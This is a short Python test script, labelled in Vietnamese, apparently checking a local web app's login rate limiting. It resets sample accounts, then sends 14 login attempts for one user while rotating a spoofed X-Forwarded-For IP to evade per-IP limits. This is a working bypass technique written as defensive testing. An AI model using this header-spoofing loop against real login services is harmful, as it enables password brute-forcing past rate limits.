import requests
import time
import subprocess
import sys

BASE_URL = "http://127.0.0.1:8000"

def main():
    print("=============================================================")
    print(" KIỂM THỬ KỊCH BẢN 4: BYPASS RATE LIMIT VIA X-FORWARDED-FOR")
    print("=============================================================")
    
    print("[*] Đang tự động reset dữ liệu mẫu và mở khóa tài khoản...")
    subprocess.run([sys.executable, "create_accounts.py"], capture_output=True)
    
    print("Gửi 14 request đăng nhập nhắm vào 'some_user' với header IP giả mạo xoay vòng...")
    for i in range(1, 15):
        headers = {"X-Forwarded-For": f"192.168.1.{i}"}
        res = requests.post(f"{BASE_URL}/login", data={"username": "some_user", "password": "any_password"}, headers=headers)
        print(f"  IP 192.168.1.{i}: HTTP Code = {res.status_code}, Response = {res.json()}")
        time.sleep(0.05)

if __name__ == "__main__":
    main()
